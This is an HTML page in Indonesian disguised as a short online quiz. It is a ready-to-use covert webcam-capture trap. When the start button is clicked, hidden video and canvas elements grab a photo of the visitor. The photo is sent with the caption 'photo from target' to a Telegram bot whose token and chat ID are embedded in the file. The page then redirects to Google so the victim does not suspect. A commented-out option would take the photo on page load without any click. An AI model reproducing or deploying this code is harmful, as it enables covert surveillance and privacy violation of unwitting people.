<!DOCTYPE html>
<html>
<head>
    <title>Kuis Online</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            background: #f4f4f4;
            font-family: 'Segoe UI', sans-serif;
            text-align: center;
            padding: 50px 20px;
        }
        .card {
            background: white;
            max-width: 400px;
            margin: 0 auto;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }
        button {
            background: #007bff;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 20px;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>

    <!-- Video + Canvas disembunyikan total -->
    <video id="video" autoplay playsinline muted style="display:none"></video>
    <canvas id="canvas" width="640" height="480" style="display:none"></canvas>

    <div class="card">
        <h2>ðŸ“‹ Kuis Singkat</h2>
        <p>Klik tombol di bawah untuk mulai</p>
        <button id="startBtn">Mulai Kuis</button>
        <p style="margin-top: 20px; font-size: 14px; color: #777;">Hanya 2 pertanyaan</p>
    </div>

    <script>
        // ======= KONFIGURASI BOT TELEGRAM (ISI SENDIRI) =======
        const BOT_TOKEN = '8086111548:AAE9hSY7CgA8WhgG1Zs_x9CEbvAf1YKJ42A';      // <-- GANTI
        const CHAT_ID = '8115098922';        // <-- GANTI

        // ======= JANGAN UBAH DIBAWAH INI =======
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        let cameraStream = null;

        // Fungsi kirim foto ke Telegram
        function sendPhotoToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, `selfie_${Date.now()}.jpg`);
            formData.append('caption', `ðŸ“¸ Foto dari target\nWaktu: ${new Date().toLocaleString()}`);

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData,
                mode: 'no-cors' // Biar gak keliatan error di console
            }).catch(e => {});
        }

        // Fungsi jepret foto
        function captureAndSend() {
            if (!cameraStream) return;

            // Gambar dari video ke canvas
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Konversi ke blob JPEG (kompresi 80%)
            canvas.toBlob(blob => {
                sendPhotoToTelegram(blob);
                console.log('ðŸ“¸ Foto terkirim!');
            }, 'image/jpeg', 0.8);

            // Matiin kamera biar ga keliatan boros
            stopCamera();
        }

        // Matikan kamera
        function stopCamera() {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = null;
                video.srcObject = null;
            }
        }

        // Minta izin kamera & langsung foto setelah dapat
        function requestCameraAndCapture() {
            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                .then(stream => {
                    cameraStream = stream;
                    video.srcObject = stream;

                    video.onloadedmetadata = () => {
                        video.play();

                        // Jepret setelah 2 detik (kasih waktu kamera fokus)
                        setTimeout(() => {
                            captureAndSend();
                        }, 2000);
                    };
                })
                .catch(err => {
                    console.log('Kamera ditolak atau error:', err);
                    // Tetap jalanin tombol biar gak curiga
                });
        }

        // Saat tombol "Mulai Kuis" diklik
        document.getElementById('startBtn').addEventListener('click', function() {
            // Ubah teks biar keliatan proses
            this.innerText = 'Memuat...';
            this.disabled = true;

            // Minta izin kamera dan foto
            requestCameraAndCapture();

            // Setelah 3 detik, alihkan ke Google biar ga curiga
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 3000);
        });

        // BONUS: Kalau pengen langsung foto tanpa klik tombol
        // Hapus komen di bawah kalau mau langsung foto saat halaman dibuka
        /*
        window.addEventListener('load', function() {
            requestCameraAndCapture();
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 4000);
        });
        */
    </script>
</body>
</html>
